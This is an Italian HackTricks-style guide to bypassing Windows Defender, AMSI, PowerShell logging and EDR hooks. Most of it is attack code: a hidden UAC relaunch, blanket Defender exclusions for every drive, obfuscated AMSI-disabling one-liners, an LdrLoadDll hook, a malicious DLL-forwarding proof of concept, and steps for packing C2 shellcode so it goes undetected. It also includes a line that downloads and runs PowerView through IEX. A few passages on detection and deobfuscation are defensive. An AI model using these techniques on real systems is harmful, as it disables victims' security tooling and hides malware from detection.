# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata inizialmente scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per interrompere il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per interrompere il funzionamento di Windows Defender fingendo di essere un altro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

I loader pubblici che si mascherano da cheat per giochi spesso vengono distribuiti come installer Node.js/Nexe non firmati che prima **chiedono all'utente l'elevazione** e solo dopo disattivano Defender. Il flusso è semplice:

1. Verificare il contesto amministrativo con `net session`. Il comando ha successo solo quando il processo chiamante ha diritti admin, quindi un errore indica che il loader è in esecuzione come utente standard.
2. Riavviarsi immediatamente con il verbo `RunAs` per attivare il prompt UAC previsto, preservando la riga di comando originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Le vittime credono già di stare installando software “cracked”, quindi il prompt viene di solito accettato, dando al malware i diritti necessari per modificare la policy di Defender.

### Esclusioni `MpPreference` a tappeto per ogni lettera di unità

Una volta elevati, i chain in stile GachiLoader massimizzano i punti ciechi di Defender invece di disabilitare del tutto il servizio. Il loader prima termina il watchdog della GUI (`taskkill /F /IM SecHealthUI.exe`) e poi imposta **esclusioni estremamente ampie** così che ogni profilo utente, directory di sistema e disco rimovibile diventi non scansionabile:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Osservazioni chiave:

- Il loop attraversa ogni filesystem montato (D:\, E:\, chiavette USB, ecc.), quindi **qualsiasi payload futuro rilasciato in qualsiasi punto del disco viene ignorato**.
- L'esclusione dell'estensione `.sys` è orientata al futuro: gli attacker si riservano la possibilità di caricare driver non firmati in seguito senza toccare di nuovo Defender.
- Tutte le modifiche finiscono sotto `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo alle fasi successive di verificare che le esclusioni persistano o di ampliarle senza riattivare UAC.

Poiché nessun servizio Defender viene arrestato, i controlli di integrità ingenui continuano a segnalare “antivirus active” anche se l'ispezione in tempo reale non tocca mai quei percorsi.

## **AV Evasion Methodology**

Attualmente, gli AV usano metodi diversi per verificare se un file è malevolo o meno: static detection, dynamic analysis e, per gli EDR più avanzati, behavioural analysis.

### **Static detection**

Static detection si ottiene segnalando stringhe malevole note o array di byte in un binario o script, e anche estraendo informazioni dal file stesso (ad es. file description, company name, digital signatures, icon, checksum, ecc.). Questo significa che usare public tools noti può farti beccare più facilmente, perché probabilmente sono già stati analizzati e segnalati come malevoli. Ci sono alcuni modi per aggirare questo tipo di detection:

- **Encryption**

Se cifri il binario, non ci sarà modo per l'AV di rilevare il tuo programma, ma avrai bisogno di qualche tipo di loader per decifrare ed eseguire il programma in memory.

- **Obfuscation**

A volte tutto ciò che devi fare è cambiare alcune stringhe nel tuo binario o script per farlo passare oltre l'AV, ma può essere un'attività che richiede molto tempo a seconda di ciò che stai cercando di obfuscate.

- **Custom tooling**

Se sviluppi i tuoi tool, non ci saranno signature malevole note, ma richiede molto tempo ed effort.

> [!TIP]
> Un buon modo per verificare la static detection di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). In pratica divide il file in più segmenti e poi chiede a Defender di scansionarli uno per uno; in questo modo può dirti esattamente quali stringhe o byte vengono segnalati nel tuo binario.

Ti consiglio molto di dare un'occhiata a questa [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sulla practical AV Evasion.

### **Dynamic analysis**

La dynamic analysis è quando l'AV esegue il tuo binario in una sandbox e osserva attività malevole (ad es. cercare di decifrare e leggere le password del browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po' più difficile da gestire, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sleep before execution** A seconda di come è implementato, può essere un ottimo modo per bypassare la dynamic analysis dell'AV. Gli AV hanno pochissimo tempo per scansionare i file senza interrompere il workflow dell'utente, quindi usare sleep lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare il sleep a seconda di come è implementato.
- **Checking machine's resources** Di solito le sandbox hanno pochissime risorse con cui lavorare (ad es. < 2GB RAM), altrimenti potrebbero rallentare la macchina dell'utente. Qui puoi anche essere molto creativo, per esempio controllando la temperatura della CPU o persino la velocità delle ventole: non tutto sarà implementato nella sandbox.
- **Machine-specific checks** Se vuoi colpire un utente il cui workstation è unito al domain "contoso.local", puoi fare un controllo sul domain del computer per vedere se corrisponde a quello che hai specificato; se non corrisponde, puoi far uscire il tuo programma.

Risulta che il computername della Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il computer name nel tuo malware prima della detonation; se il nome corrisponde a HAL9TH, significa che sei dentro la sandbox di defender, quindi puoi far uscire il tuo programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli di [@mgeeky](https://twitter.com/mariuszbit) per andare contro le Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come abbiamo detto prima in questo post, i **public tools** alla fine **verranno rilevati**, quindi dovresti porti una domanda:

Per esempio, se vuoi dumpare LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno noto, che dumpa anche LSASS.

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei pezzi di malware più segnalati, se non il più segnalato, da AV ed EDR; mentre il progetto in sé è super cool, è anche un incubo lavorarci per aggirare gli AV, quindi cerca semplicemente alternative per ciò che stai cercando di ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per evasion, assicurati di **disattivare l'invio automatico dei sample** in defender e, per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere evasion nel lungo periodo. Se vuoi verificare se il tuo payload viene rilevato da un particolare AV, installalo su una VM, prova a disattivare l'invio automatico dei sample e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Ogni volta che è possibile, **dai sempre priorità all'uso delle DLL per evasion**; nella mia esperienza, i file DLL sono solitamente **molto meno rilevati** e analizzati, quindi è un trucco molto semplice da usare per evitare la detection in alcuni casi (se il tuo payload ha in qualche modo la possibilità di funzionare come DLL, ovviamente).

Come possiamo vedere in questa immagine, un DLL Payload di Havoc ha un detection rate di 4/26 su antiscan.me, mentre il payload EXE ha un detection rate di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un normale payload Havoc EXE e un normale Havoc DLL</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader posizionando l'applicazione vittima e i payload malevoli uno accanto all'altro.

Puoi cercare programmi suscettibili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e il seguente powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando mostrerà l'elenco dei programmi vulnerabili a DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che cercano di caricare.

Ti consiglio vivamente di **esplorare da solo i programmi DLL Hijackable/Sideloadable**: questa tecnica è piuttosto stealthy se fatta correttamente, ma se usi programmi DLL Sideloadable noti pubblicamente, potresti farti scoprire facilmente.

Semplicemente inserendo una DLL malevola con il nome che un programma si aspetta di caricare, non verrà caricato il tuo payload, perché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema, useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma esegue dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma ed essendo in grado di gestire l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci darà 2 file: un template del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (encoded con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento 0/26 su [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Consiglio **vivamente** di guardare il [VOD su twitch di S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per saperne di più su ciò che abbiamo discusso in modo più approfondito.

### Abusing Forwarded Exports (ForwardSideLoading)

I moduli Windows PE possono esportare funzioni che in realtà sono "forwarders": invece di puntare al codice, la voce di export contiene una stringa ASCII del tipo `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il Windows loader farà quanto segue:

- Caricare `TargetDll` se non è già caricato
- Risolvere `TargetFunc` da esso

Comportamenti chiave da capire:
- Se `TargetDll` è una KnownDLL, viene fornita dal namespace protetto KnownDLLs (ad es. ntdll, kernelbase, ole32).
- Se `TargetDll` non è una KnownDLL, viene usato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta eseguendo la forward resolution.

Questo abilita una primitive di sideloading indiretta: trova una DLL firmata che esporta una funzione inoltrata a un nome di modulo non-KnownDLL, poi affianca quella DLL firmata a una DLL controllata dall'attaccante chiamata esattamente come il modulo di destinazione inoltrato. Quando l'export inoltrato viene invocato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo la tua DllMain.

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite il normale ordine di ricerca.

PoC (copia-incolla):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Metti un `NCRYPTPROV.dll` malevolo nella stessa cartella. Una `DllMain` minimale è sufficiente per ottenere l'esecuzione del codice; non è necessario implementare la funzione inoltrata per attivare `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (signed) carica la side-by-side `keyiso.dll` (signed)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader quindi carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, otterrai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la hunting:
- Concentrati sugli exported forwarded in cui il modulo di destinazione non è un KnownDLL. I KnownDLLs sono elencati in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare gli forwarded exports con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Vedi l’inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Idee di detection/defense:
- Monitora i LOLBins (es. rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Genera alert su catene processo/modulo come: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` sotto percorsi scrivibili dall’utente
- Applica policy di code integrity (WDAC/AppLocker) e nega write+execute nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo stealth.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L’evasion è solo un gioco del gatto e del topo, ciò che funziona oggi potrebbe essere rilevato domani, quindi non affidarti mai a un solo tool; se possibile, prova a concatenare più tecniche di evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Gli EDR spesso inseriscono **user-mode inline hooks** sugli stub syscall di `ntdll.dll`. Per bypassare questi hook, puoi generare stub syscall **direct** o **indirect** che caricano il **SSN** corretto (System Service Number) e passano in kernel mode senza eseguire l'export entrypoint hookato.

**Opzioni di invocazione:**
- **Direct (embedded)**: emette un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (nessun hit all'export di `ntdll`).
- **Indirect**: salta dentro un gadget `syscall` esistente in `ntdll` così la transizione al kernel sembra originare da `ntdll` (utile per evasion euristica); **randomized indirect** seleziona un gadget da un pool per ogni chiamata.
- **Egg-hunt**: evita di incorporare sul disco la sequenza statica `0F 05`; risolve una sequenza syscall a runtime.

**Strategie di risoluzione SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: inferisce gli SSN ordinando gli stub syscall per virtual address invece di leggere i byte dello stub.
- **SyscallsFromDisk**: mappa una `\KnownDlls\ntdll.dll` pulita, legge gli SSN dal suo `.text`, poi la smonta (bypassa tutti gli hook in memoria).
- **RecycledGate**: combina l'inferenza SSN ordinata per VA con la validazione degli opcode quando uno stub è pulito; torna all'inferenza VA se è hookato.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e usa una VEH per catturare l'SSN da `EAX` a runtime, senza analizzare byte hookati.

Esempio di utilizzo di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire il "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di scansionare solo **file su disco**, quindi se riuscivi in qualche modo a eseguire payload **direttamente in-memory**, l'AV non poteva fare nulla per impedirlo, perché non aveva abbastanza visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

- User Account Control, o UAC (elevazione di EXE, COM, MSI o installazione ActiveX)
- PowerShell (script, uso interattivo e valutazione di codice dinamico)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Office VBA macros

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendo il contenuto degli script in una forma sia non cifrata che non offuscata.

Eseguire `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente alert su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come antepone `amsi:` e poi il percorso dell'eseguibile da cui lo script è stato eseguito, in questo caso, powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati intercettati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene eseguito attraverso AMSI. Questo influisce persino su `Assembly.Load(byte[])` per il caricamento dell'esecuzione in-memory. Per questo motivo, usare versioni più basse di .NET (come 4.7.2 o inferiori) è raccomandato per l'esecuzione in-memory se vuoi eludere AMSI.

Ci sono alcuni modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI funziona principalmente con rilevamenti statici, quindi modificare gli script che provi a caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI ha la capacità di deoffuscare gli script anche se hanno più livelli, quindi l'obfuscation potrebbe essere una cattiva opzione a seconda di come viene fatta. Questo rende l'elusione non così immediata. Anche se, a volte, tutto ciò che devi fare è cambiare un paio di nomi di variabili e andrà bene, quindi dipende da quanto qualcosa sia stato segnalato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche eseguendo come utente non privilegiato. A causa di questo difetto nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione di AMSI.

**Forcing an Error**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Originariamente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un uso più ampio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una sola riga di codice powershell per rendere AMSI inutilizzabile per il processo powershell corrente. Questa riga è stata naturalmente segnalata da AMSI stesso, quindi è necessaria una modifica per poter usare questa tecnica.

Ecco un bypass di AMSI modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che questo verrà probabilmente segnalato una volta che questo post uscirà, quindi non dovresti pubblicare alcun codice se il tuo obiettivo è rimanere non rilevato.

**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverlo con istruzioni che restituiscono il codice per E_INVALIDARG; in questo modo, il risultato della scansione effettiva restituirà 0, che viene interpretato come un risultato pulito.

> [!TIP]
> Per una spiegazione più dettagliata, leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Esistono anche molte altre tecniche usate per bypassare AMSI con powershell, controlla [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più su di esse.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto, indipendente dal linguaggio, consiste nel posizionare un hook in user-mode su `ntdll!LdrLoadDll` che restituisce un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e non avviene alcuna scansione per quel processo.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Funziona sia con PowerShell, WScript/CScript e loader custom allo stesso modo (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Da abbinare all’invio di script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare lunghi artefatti nella command-line.
- Visto in uso da loader eseguiti tramite LOLBins (ad es. `regsvr32` che chiama `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remove the detected signature**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questo strumento funziona scansionando la memoria del processo corrente alla ricerca della signature AMSI e sovrascrivendola con istruzioni NOP, rimuovendola di fatto dalla memoria.

**AV/EDR products that uses AMSI**

Puoi trovare un elenco di prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Se usi la versione 2 di PowerShell, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi fare così:
```bash
powershell.exe -version 2
```
## PS Logging

Il logging di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Può essere utile per scopi di auditing e troubleshooting, ma può anche essere un **problema per gli attacker che vogliono eludere il rilevamento**.

Per aggirare il logging di PowerShell, puoi usare le seguenti tecniche:

- **Disabilitare PowerShell Transcription e Module Logging**: Puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) per questo scopo.
- **Usare Powershell version 2**: Se usi PowerShell version 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi fare così: `powershell.exe -version 2`
- **Usare una sessione Powershell non gestita**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per avviare un powershell senza difese (è ciò che usa `powerpick` di Cobal Strike).


## Obfuscation

> [!TIP]
> Diverse tecniche di obfuscation si basano sulla cifratura dei dati, il che aumenterà l'entropy del binary e renderà più facile per AVs e EDRs rilevarlo. Fai attenzione a questo e magari applica la cifratura solo a sezioni specifiche del tuo codice che sono sensibili o devono essere nascoste.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali) è comune affrontare diversi livelli di protezione che bloccheranno decompiler e sandboxes. Il workflow qui sotto ripristina in modo affidabile **un IL quasi originale** che potrà poi essere decompilato in C# con tool come dnSpy o ILSpy.

1.  Rimozione anti-tampering – ConfuserEx cifra ogni *method body* e lo decifra all'interno del costruttore statico del *module* (`<Module>.cctor`). Questo applica anche il checksum PE, quindi qualsiasi modifica farà crashare il binary. Usa **AntiTamperKiller** per individuare le tabelle di metadata cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando costruisci il tuo unpacker.

2.  Recupero dei simboli / del control-flow – passa il file *clean* a **de4dot-cex** (un fork di de4dot consapevole di ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flag:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il flattening del control-flow, ripristinerà i namespace, le classi e i nomi delle variabili originali e decifrerà le stringhe costanti.

3.  Rimozione dei proxy-call – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (detti anche *proxy calls*) per rompere ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti osservare normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binary risultante in dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il *real* payload. Spesso il malware lo memorizza come un byte array codificato TLV inizializzato all'interno di `<Module>.byte_0`.

La chain sopra ripristina il flusso di esecuzione **senza** dover eseguire il sample malevolo – utile quando lavori su una workstation offline.

> 🛈  ConfuserEx produce un custom attribute chiamato `ConfusedByAttribute` che può essere usato come IOC per triage automatico dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'obiettivo di questo progetto è fornire una fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di offrire maggiore sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare, in fase di compilazione, codice offuscato senza usare alcuno strumento esterno e senza modificare il compiler.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni offuscate generate dal framework di template metaprogramming di C++ che renderà la vita della persona che vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un obfuscator binario x64 in grado di offuscare vari file pe diversi, inclusi: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation a grana fine per linguaggi supportati da LLVM che usa ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando le istruzioni regolari in catene ROP, frustrando la nostra naturale concezione del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi alcuni eseguibili da internet ed esegui them.

Microsoft Defender SmartScreen è un meccanismo di sicurezza progettato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente malevole.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che applicazioni scaricate poco comunemente attiveranno SmartScreen, avvisando e impedendo all'utente finale di eseguire il file (anche se il file può ancora essere eseguito cliccando More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier che viene creato automaticamente al momento del download dei file da internet, insieme all'URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo dell'ADS Zone.Identifier per un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

